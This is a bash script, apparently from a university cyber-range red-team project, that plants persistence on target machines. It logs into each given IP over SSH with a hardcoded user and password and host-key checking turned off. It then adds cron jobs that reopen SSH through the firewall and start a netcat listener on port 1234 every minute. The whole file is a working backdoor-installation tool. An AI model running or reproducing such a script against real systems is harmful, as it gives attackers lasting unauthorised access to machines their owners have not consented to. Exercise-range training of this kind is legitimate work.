#!/bin/bash

<<COMMENT

=============================================================================

 Central Texas Cyber Range (CTCR)

=============================================================================

 Maker:       Ethan Vowels

 Maintainer:  Ethan Vowels

 Project:     CIIRC

 Filename:    persistence.sh

Git: Abanisenioluwa_oroj1

 Description:

    This script will create multiple areas of persistence on the target machine. 

 Extension Principle:

    None

 License:

    MIT

 Additional Information:

    - Date Created: 5/17/2024

    - Last Updated: 6/17/2024

    - Contact: ethan_vowels1@baylor.edu

    - Repository: Gitlab CIIRC Hack

=============================================================================

COMMENT

# Ensure this script is run with IP addresses as arguments
if [ $# -lt 1 ]; then
  echo "Usage: $0 <IP_Address1> [IP_Address2] ..."
  exit 1
fi

# Collect all IP addresses provided as arguments
TARGET_IPS=("$@")

# SSH User
SSH_USER="hr"
SSH_PASS="MegaBiteRules23!"

for TARGET_IP in "${TARGET_IPS[@]}"; do
  echo "Processing target: $TARGET_IP"

  # Connect over SSH and execute commands
  sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no "$SSH_USER@$TARGET_IP" << EOF

    # Add cron jobs to allow SSH and start netcat listener
    (crontab -l 2>/dev/null; echo '* * * * * sudo ufw allow 22') | crontab -
    (crontab -l 2>/dev/null; echo '* * * * * nc -l -p 1234') | crontab -
EOF

  echo "Commands executed on $TARGET_IP"
done

echo "Script is complete."
